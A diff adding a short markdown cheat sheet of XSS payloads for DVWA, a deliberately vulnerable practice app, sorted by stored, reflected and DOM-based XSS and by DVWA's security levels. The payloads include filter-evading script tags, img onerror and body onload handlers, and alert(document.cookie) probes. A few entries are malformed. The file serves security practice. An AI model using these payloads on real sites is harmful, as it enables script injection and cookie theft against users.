@@ -1,0 +1,33 @@
+## DVWA XSS Testing Payloads 
+
+
+## Stored XSS Payloads :-
+
+-> <script>alert("you have been hacked") - Low level Severity Payload.
+
+-> <Script>alert("XSS")</sCRipt> - Medium Level Severity Payload.
+
+-> <img src=sd onerror=alert("boby")> - HTML Tag for High Level Severity Payload.
+
+-> body onload=alert("boby')> - HTML Body tag fir High Level Seveiry Payload.
+
+
+## Reflected XSS Payload :-
+-> <script>alert("dvwa")</script> - Low Level Severity Payload.
+
+-> <Script>alert("DVWA")</sCRipt> - Medium Level Severity Payload.
+
+-><img src=ss onError=alert(document.cookie)> -> HTML Tag 
+
+-><body onload=alert(document.cookie)> -> HTML body tag  both are  High level Seveiry Payloads.
+
+
+## DOM Based XSS :-
+
+-><script>alert("Hacker")</script> - Low Level Severity.
+
+->#<script>alert("Hacker")</script> - Medium level Severity. 
+
+->#<script>alert(document.cookie)</script> - High level Severity.
+
+
